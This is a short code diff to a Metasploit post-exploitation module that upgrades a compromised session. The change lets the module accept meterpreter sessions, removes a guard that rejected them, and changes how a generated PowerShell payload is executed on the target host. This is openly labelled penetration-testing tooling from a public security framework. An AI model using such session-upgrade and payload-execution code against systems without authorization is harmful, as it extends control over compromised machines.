@@ -22,7 +22,7 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => ['Tom Sellers <tom [at] fadedcode.net>'],
         'Platform' => [ 'linux', 'osx', 'unix', 'solaris', 'bsd', 'windows' ],
-        'SessionTypes' => [ 'shell' ]
+        'SessionTypes' => [ 'shell', 'meterpreter' ]
       )
     )
     register_options(
@@ -53,11 +53,6 @@ class MetasploitModule < Msf::Post
   # Run method for when run command is issued
   def run
     print_status("Upgrading session ID: #{datastore['SESSION']}")
-
-    if session.type == 'meterpreter'
-      print_error('Meterpreter sessions cannot be upgraded any higher')
-      return nil
-    end
 
     # Try hard to find a valid LHOST value in order to
     # make running 'sessions -u' as robust as possible.
@@ -181,7 +176,7 @@ class MetasploitModule < Msf::Post
           cmd_exec("echo. | #{cmd_psh_payload(payload_data, psh_arch, psh_opts)}")
         else
           psh_opts[:remove_comspec] = true
-          cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
+          cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts), nil, 15, { 'Channelized' => false })
         end
       else
         print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'
